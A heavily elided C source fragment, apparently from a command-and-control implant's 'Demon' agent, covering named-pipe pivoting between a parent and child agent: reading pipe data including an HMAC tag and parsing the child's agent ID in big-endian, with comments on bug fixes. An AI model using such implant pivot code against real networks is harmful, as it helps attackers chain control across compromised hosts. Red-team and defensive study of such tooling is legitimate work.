        ...
        if ( TempList->Handle )
        {
            ...
            do {
                ...
                if ( Instance->Win32.PeekNamedPipe( TempList->Handle, NULL, 0, NULL, &BytesSize, NULL ) )
                {
                    ...
                    {
                        /*
                         * Read ALL available bytes from the pipe, not just what the Size field says.
                         * The child's TransportMacAppend adds a 32-byte HMAC tag AFTER the Size field
                         * is written, so Size doesn't account for the MAC. Reading only Size bytes
                         * would leave 32 orphaned MAC bytes in the pipe that corrupt subsequent reads.
                         *
                         * BytesSize from the first PeekNamedPipe gives us the total available bytes
                         * including the MAC — use that as the read length.
                         */
                        {
                            Length = BytesSize;
...
UINT32 PivotParseDemonID( PVOID Response, SIZE_T Size )
{
    ...
    /*
     * The wire format from the child agent uses Big-Endian integers
     * (written by Int32ToBuffer/PackageAddInt32). Set the parser to
     * BE mode so ParserGetInt32 applies bswap32 and returns the
     * correct native value.
     *
     * Without this, the stored DemonID would be bswap32(real_AgentID),
     * which happened to work before because both store and lookup
     * used the same broken LE parsing. Now we fix it to store the
     * correct value.
     */
    Parser.Endian = TRUE;

    ParserGetInt32( &Parser );  // Skip Size (BE)
    ParserGetInt32( &Parser );  // Skip Magic (BE)

    Value = ParserGetInt32( &Parser );  // AgentID (BE → native)
